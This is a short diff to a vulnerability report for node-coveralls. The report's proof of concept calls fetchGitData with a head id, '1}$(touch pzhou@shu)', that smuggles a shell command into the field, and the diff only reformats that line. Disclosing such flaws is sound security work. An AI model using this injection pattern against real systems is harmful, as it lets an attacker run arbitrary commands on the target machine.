@@ -7,5 +7,6 @@ The function fetchGitData in node-coveralls is vulnerable to command injection.
 Create a .js file with the content below and run it, then the file pzhou@shu should be created.
 
 var fetchGitData = require('coveralls/lib/fetchGitData');
-fetchGitData({head:{id:'1}$(touch pzhou@shu)'}},() => {})
+
+fetchGitData({head:{id:'1}$(touch pzhou@shu)'}},() => {});
 
